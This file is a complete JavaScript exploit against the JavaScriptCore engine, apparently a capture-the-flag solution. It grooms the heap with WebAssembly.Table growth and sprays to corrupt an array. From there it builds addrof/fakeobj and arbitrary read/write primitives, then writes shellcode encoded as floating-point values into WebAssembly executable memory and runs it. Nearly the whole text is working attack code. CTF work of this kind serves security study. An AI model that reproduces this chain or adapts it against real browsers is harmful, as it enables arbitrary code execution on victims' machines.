print("[+] start");

let conversion_buffer = new ArrayBuffer(8);
let f64 = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);
let i32 = new Uint32Array(conversion_buffer);
BigInt.prototype.hex = function () {
    return '0x' + this.toString(16);
};
BigInt.prototype.i2f = function () {
    int_view[0] = this;
    return f64[0];
}

Number.prototype.f2i = function () {
    f64[0] = this;
    return int_view[0];
}

Number.prototype.i2f = function () {
    return BigInt(this).i2f();
}

function hex(a) {
    return "0x" + a.toString(16);
}

// stage 2 prep. put it here because later it's unsafe to execute when everything is corrupted
var structure_spray = []
for (var i = 0; i < 1000; ++i) {
    
    var ary = {a:1,b:2,c:3,d:4,e:5,f:6,g:0xfffffff};
    ary['prop_' + i] = 1;
    structure_spray.push(ary);
    
}


var manager = structure_spray[500];

var unboxed = eval('[' + '13.37,'.repeat(1000) + ']');
var boxed = [{}];
var victim = [];
victim.p0 = 0x1337;

//////////////////////////////////////////////////////


var nogc = [];
// defragment
for (var i = 0; i < 1000; i++) {
    nogc.push(new Array(8).fill(1.1))
}

const growLength = 506;
const victimOldLength = 512;
const innerLoopCount = 100;
const baseIdxShift = 1024;
const reclaimLength = 100;
const growSize = 100;

var tbl = new WebAssembly.Table({ initial: baseIdxShift, element: "externref" });
v = new Array(growLength)
var idx = 0;
reclaim = new Array();
var idx2 = 0;
// print(describe(tbl))
// print(describe(v))

let oob_idx = -1;
let target = null;
let big_array = null;
try {
    for (var i = 0; i < growLength; i++) {
        // print(i)
        for (var k = 0; k < innerLoopCount; k++) {
            tbl.grow(growSize, new Array(victimOldLength).fill(2261634.5098039214));
        }

        // provoke gc
        v[idx++] = new String("C").repeat(0x10000);

        for (var j = baseIdxShift + (i * innerLoopCount); j < tbl.length; j++) {
            // this reclaims old butterfly
            if (j % 1 == 0) {
                reclaim[idx2++] = new Uint8Array(new ArrayBuffer(1)).fill(0x69);
            }

            // check if butterfly was reclaimed
            if (tbl.get(j).length != victimOldLength) {
                print("found!!! @ " + tbl.get(j).length);
                // print(describe(tbl.get(j)))
                // print(describe(tbl.get(j - 1)))
                big_array = tbl.get(j);

                // make sure our cell with bad butterfly wont be collected
                for (var q = 0; q < 10; q++) {
                    gc();
                }

                var o = { a: 1.1, b: 1.1, c: 1.1, d: 1.1 };

                // spray arrays that will be used for stage 1 primitives
                var spray = [];
                for (var q = 0; q < 1000; q++) {
                    spray.push(new Array(3.84141116565189491291e-226, o));
                }

                // move spray to old space (hopefully after our victim)
                for (var q = 0; q < 10; q++) {
                    gc();
                }

                // print(describe(spray[spray.length - 1]))
                // print(describe(big_array))
                // print(describe(o))

                for (var q = 0; q < 10; q++) {
                    print("[" + q + "] = " + big_array[q]);
                }


                // watch out! marker is tagged
                const marker = 0x1124334411223344n;
                //             0x1122334411223344n

                // find sprayed array
                // initial index is used as 0xa0000 because in local tests the distance is somewhere around 0x500000 bytes
                print("[*] starting search; current length -> " + hex(big_array.length))
                const index_hint = 0xa0000
                for (var q = 0; q < big_array.length; q++) {
                    // if(typeof(victim[q]) != "undefined" && victim[q].f2i() != 0){
                    //     print("=>["+hex(q)+"] = "+ hex(victim[q].f2i()))
                    // }

                    if (typeof (big_array[q]) != "undefined" && big_array[q].f2i() == 0x1124334411223344n) {
                        print("found corruption target @ index " + q.toString(16));
                        oob_idx = q + 1;

                        // verify that it's indeed it. using eval to prevent optimization
                        eval("big_array[q] = (0x1124334411223345n).i2f()");

                        for (elm of spray) {
                            if (elm[0] != 3.84141116565189491291e-226) {
                                print("corruption target confirmed, overwritten value -> " + hex(elm[0].f2i()))
                                target = elm;
                                throw "1"
                            }
                            
                        }

                        break;
                    }
                }
                
                print("didn't find :(");
                throw "0";    
            }
        }



    }
} catch (e) {
    print("caught exc: "+ e.toString())
    if(e == "0"){
        // end , fatal failure
        throw "[-] fatal.."
    }
}


// stage 2
// construct addrof/fakeobj
function addrof(obj) {
    target[1] = obj;
    print("[dbg] addrof -> " + hex(big_array[oob_idx].f2i()))
    return big_array[oob_idx].f2i()
}

function fakeobj(addr) {
    big_array[oob_idx] = addr.i2f();
    return target[1];
}

print("[*] testing addrof/fakeobj");
// print("[*] target -> " + describe(target))
var x = []
// print(describe(x));
print("[*] addrof -> " + hex(addrof(x)));

if (addrof(fakeobj(0x4141414141n)) != 0x4141414141n){
    print("[-] fakeobj failure");
    throw 0;
}
print("[+] fakeobj/addrof OK");

x_strid = leakStrid(x); // backdoored helper
print("[*] strid: " + x_strid);


// construct AARW
// stolen from https://ptr-yudai.hatenablog.com/entry/2020/03/23/105837#pwn-500pts-The-Return-of-the-Slide
var leak_addr = addrof(manager);
print('[+] leaking from: '+ hex(leak_addr));



function victim_write(val) {
    victim.p0 = val;
}
function victim_read() {
    return victim.p0;
}

/* Create a fake object */
i32[0] = x_strid; // Structure ID
i32[1] = 0x01082007 - 0x20000 // Fake JSCell metadata
var outer = {
    p0: f64[0],    // Structure ID and metadata
    p1: manager,   // butterfly
    p2: 0xfffffff, // Butterfly indexing mask
}

var fake_addr = addrof(outer) + 0x10n;
print('[+] fake_addr = ' + hex(fake_addr));

var unboxed_addr = addrof(unboxed)
var boxed_addr = addrof(boxed)
var victim_addr = addrof(victim)
var holder = {fake: {}}
holder.fake = fakeobj(fake_addr)

// print("unboxed -> " + describe(unboxed))
// print("boxed -> " + describe(boxed))
// Share a butterfly
var shared_butterfly = holder.fake[(unboxed_addr + 8n - leak_addr) / 8n].f2i();
print("[+] shared_butterfly @ "+ hex(shared_butterfly))
var boxed_butterfly = holder.fake[(boxed_addr + 8n - leak_addr) / 8n].f2i();
print("[+] boxed_butterfly @ "+ hex(boxed_butterfly))



holder.fake[(boxed_addr + 8n - leak_addr) / 8n] = shared_butterfly.i2f();
var victim_butterfly = holder.fake[(victim_addr + 8n - leak_addr) / 8n]
// print("victim -> " + describe(victim))
print("[+] victim butterfly @ "+ hex(victim_butterfly.f2i()))

function set_victim_addr(where) {
    holder.fake[(victim_addr + 8n - leak_addr) / 8n] = (where + 0x10n).i2f();
}
function reset_victim_addr() {
    holder.fake[(victim_addr + 8n - leak_addr) / 8n] = victim_butterfly
}



var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

var stage2 = {
    addrof: function(victim) {
        boxed[0] = victim
        return unboxed[0].f2i();
    },
    
    fakeobj: function(addr) {
        unboxed[0] = addr
        return boxed[0]
    },
    write64: function(where, what) {
        // handle value tagging
        what = (what.f2i() - 0x2000000000000n).i2f()

        set_victim_addr(where)
        victim_write(what)
        reset_victim_addr()
    },
    read64: function(where) {
        set_victim_addr(where)
        var res = this.addrof(victim_read())
        reset_victim_addr()
        return res
    },
    write: function(where, values) {
        for (var i = 0n; i < values.length; ++i) {
            if (values[i] != 0)
                this.write64(where + i*8n, values[i])
        }
    },
}

var addr_f = addrof(f);


var addr_p = stage2.read64(addr_f + 0x30n);
var addr_shellcode = stage2.read64(addr_p);
print("&f = " + hex(addr_f));
print("&p = " + hex(addr_p));
print("&shellcode = " + hex(addr_shellcode));

//var sc = [-9.25596313493178307368e+61,-9.25596313493178307368e+61,-9.25596313493178307368e+61,-9.25596313493178307368e+61]
var sc = [7.340387646374746e+223, -5.632314578774827e+190, 2.820972646004203e-134, 1.7997858657482317e+204, -6.038714811533287e-264, 2.6348604761052688e-284]
stage2.write(addr_shellcode,sc)
f();

print("[+] end!");
